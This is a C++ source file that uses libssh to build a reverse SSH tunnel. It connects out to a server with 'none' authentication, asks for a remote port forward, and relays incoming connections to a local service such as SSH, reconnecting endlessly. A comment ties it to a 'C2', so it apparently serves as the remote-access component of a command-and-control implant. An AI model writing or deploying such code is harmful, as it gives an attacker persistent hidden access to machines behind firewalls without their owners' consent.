#define LIBSSH_STATIC 1

#include <libssh/libssh.h>
#include <libssh/server.h>

#include <stdio.h>
#include <thread>

#include "client.h"
#include "global.h"

#ifdef _WIN32
#include <Ws2tcpip.h>
#define close closesocket
#define poll WSAPoll
#else
#include <arpa/inet.h>
#include <string.h>
#include <poll.h>
#endif // _WIN32

int SSHClient::should_terminate = 0;
pthread_mutex_t SSHClient::mutex;

SSHClient::SSHClient()
{

#ifdef _WIN32
    InitializeCriticalSection(&mutex);
#else
    pthread_mutex_init(&mutex, NULL);
#endif // _WIN32
}

int SSHClient::connect_to_local_service(int port)
{
    int sockfd = 0;

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        debug("inet_pton\n");
        return -1;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        debug("socket\n");
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
        0) {
        debug("connect\n");
        return -1;
    }

    return sockfd;
}



int SSHClient::do_remote_forwarding_loop(ssh_session session, ssh_channel channel, int lport, pthread_mutex_t* mutex)
{
    int sockfd;
    int rc;
    char buffer[4096];

    debug("[OTCP] Connecting to localhost:%d...", lport);
    /* Connect to the service */
    sockfd = connect_to_local_service(lport);
    if (sockfd == -1) {
        debug("[DEBUG] connect_to_local_service failed\n");
        return SERVICE_CONN_ERROR;
    }

	// Set not blocking
    //As far as I know this is not necessary.
    // We are using poll to know in advance if there is data to read,
    // so recv is not going to block because we only call it when there is data
// #ifdef _WIN32
//     u_long iMode = 1;
//     ioctlsocket(sockfd, FIONBIO, &iMode);
// #endif // _WIN32

    int nbytes = 0, nwritten = 0;

    struct pollfd fds[1];
    fds[0].fd = sockfd;
    fds[0].events = POLLIN;

    while (!should_terminate && ssh_is_connected(session)) {
        //First we poll the local service socket, sockfd, for 100 millisecons
        rc = poll(fds, 1, 100);
        if (rc == -1) {
            close(sockfd);
            return SYSTEM_ERROR;
        }
        //If there is anything to read then read it and write it to the channel
        if (fds[0].revents & POLLIN) {
            nbytes = recv(sockfd, buffer, sizeof(buffer), 0);
            if (nbytes < 0) {
                if (errno != EAGAIN && errno != EWOULDBLOCK) {
                    close(sockfd);
                    return SERVICE_CONN_ERROR;
                }
            }
            else if (nbytes == 0) {
                debug("[DEBUG] recv: EOF\n");
                close(sockfd);
                return SERVICE_SENT_EOF;
            }
            debug("[DEBUG] Read %d bytes from service\n", nbytes);

            int tot_sent = 0;
            while (tot_sent < nbytes) {
                //debug("Before ssh_channel_write. tot_sent=%d nbytes=%d\n", tot_sent, nbytes);
                pthread_mutex_lock(mutex);
                nwritten = ssh_channel_write(channel, buffer + tot_sent, nbytes - tot_sent);
                pthread_mutex_unlock(mutex);
                
                //debug("After ssh_channel_write, nwritten=%d\n", nwritten);
                if (nwritten == SSH_ERROR) {
                    debug("[DEBUG] ssh_channel_write: %s\n", ssh_get_error(session));
                    close(sockfd);
                    return SSH_ERROR;
                }
                else {
                    tot_sent += nwritten;
                    debug("[DEBUG] Sent %d bytes to SSH tunnel\n", nwritten);
                }
            }
        }

        //Next, we poll the channel
        pthread_mutex_lock(mutex);
        rc = ssh_channel_poll(channel, 0);
        pthread_mutex_unlock(mutex);

        //debug("ssh_channel_poll rc=%d\n", rc);
        //If there is anything to read then read it and write it to the socket
        if (rc != 0 && rc != SSH_ERROR) {
            //nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);
            //debug("ssh_channel_read, sizeof(buffer) %d\n", sizeof(buffer));
            pthread_mutex_lock(mutex);
            nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
            pthread_mutex_unlock(mutex);
            
            if (nbytes == 0) {
                if (ssh_channel_is_eof(channel) || !ssh_channel_is_open(channel)) {
                    close(sockfd);
                    return SSH_SENT_EOF;
                }
            }
            if (nbytes == SSH_ERROR) {
                debug("[DEBUG] ssh_channel_read: %s\n", ssh_get_error(session));
                close(sockfd);
                return SSH_ERROR;
            }
            if (nbytes > 0) {
                debug("[DEBUG] Read %d bytes from SSH tunnel\n", nbytes);

                /* Write to service */
                int tot_sent = 0;
                while (tot_sent < nbytes) {
                    nwritten = send(sockfd, buffer + tot_sent, nbytes - tot_sent, 0);

                    if (nwritten < 0) {
                        if (errno != EAGAIN && errno != EWOULDBLOCK) {
                            close(sockfd);
                            return SERVICE_CONN_ERROR;
                        }
                    }
                    else {
                        tot_sent += nwritten;
                        debug("[DEBUG] Sent %d bytes to service\n", nwritten);
                    }
                }
            }
        }
    }
    return SSH_OK;
}

void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int lport, pthread_mutex_t* mutex) {
	int rc = do_remote_forwarding_loop(sess, chan, lport, mutex);
	if (rc == SSH_SENT_EOF || rc == SSH_ERROR || rc == SYSTEM_ERROR) {
		debug("[OTCP] Terminate SSH channel\n");
		ssh_channel_send_eof(chan);
		ssh_channel_free(chan);
		return ;
	}
	else {
		/* The service has either sent EOF
		   or an error condition occurred, but
		   the tunnel is still open.
		   Accept a new connection. */
		debug("[DEBUG] Service disconnected. rc = %d\n", rc);
		ssh_channel_send_eof(chan);
		debug("[DEBUG] Sent SSH EOF\n");
		ssh_channel_free(chan);
		debug("[DEBUG] Freed channel\n");
		return;
	}
}


/* OpenSSH command equivalent:
 * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
 *
 * lport:   port to forward to once tunnel established  // usually 22 for us 2222
 * rport:   port the ssh server will be listening on    // we will do in the C2: ssh localhost -p [rport]
 */
int SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t* mutex) {
    debug("[OTCP] Opening port T:%d on server...\n", lport);
    int bounded_port = 0;
    int ret = 0;
#ifdef IS_DEBUG
	int remote_liste_port = 1234;
#else
	int remote_liste_port = 0;
#endif
    auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", remote_liste_port, &bounded_port);
    if (rc != SSH_OK) {
        debug("[DEBUG] failed: %s\n", ssh_get_error(sess));
        ret = 1;
        goto clean;
    }
    debug("Check port %d in remote server\n", bounded_port?bounded_port:remote_liste_port);

	ssh_channel chan;
    while (!should_terminate) {
        int dport = 0;	// The port bound on the server, here: 8080
        debug("[OTCP] Waiting for incoming connection...\n");


        pthread_mutex_lock(mutex);
        chan = ssh_channel_accept_forward(sess, ACCEPT_FORWARD_TIMEOUT, &dport);
        pthread_mutex_unlock(mutex);
        if (chan == NULL) {
            if (!ssh_is_connected(sess)) {
                goto clean;
            }

            debug("[DEBUG] failed: code: %d msg: %s\n", ssh_get_error_code(sess), ssh_get_error(sess));
            if (ssh_get_error_code(sess) != 0) {	/* Timed out */
                ret = 1;
                goto clean;
            }
            else {
                continue;
            }
        }
        debug("\n[OTCP] Connection received\n");
		std::thread(SSHClient::remote_forwading_thread, sess, chan, lport, mutex).detach();
		//SSHClient::remote_forwading_thread(sess, chan, lport);   
    }
clean:
    if (ssh_is_connected(sess))
        ssh_disconnect(sess);
    ssh_free(sess);
    return ret;
}


int SSHClient::run(const char* username, const char* host, int port)
{
    ssh_session my_ssh_session;
#ifdef IS_DEBUG
    int verbosity = SSH_LOG_FUNCTIONS;
#else
    int verbosity = SSH_LOG_NOLOG;
#endif // DEBUG

    int rc;
    int ret = 0;
   

    do 
    {
        // Open session and set options
        my_ssh_session = ssh_new();
        if (my_ssh_session == NULL)
            exit(-1);
        auto a = ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT_STR, "22");

        // Connect to server
        rc = ssh_connect(my_ssh_session);
        if (rc != SSH_OK){
            debug("Error connecting to %s: %s\n",
                host,
                ssh_get_error(my_ssh_session));
            ssh_free(my_ssh_session);
            exit(-1);
        }

        rc = ssh_userauth_none(my_ssh_session, username);
        if (rc != SSH_AUTH_SUCCESS){
            debug("Error authenticating with password: %s\n",
                ssh_get_error(my_ssh_session));
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            exit(-1);
        }


        // do something
        do_remote_forwarding(my_ssh_session, port, &SSHClient::mutex);
    } while(!should_terminate); // When the clients disconnects we try to reconnect it again

clean:
    pthread_mutex_destroy(&mutex);

    return 0;
}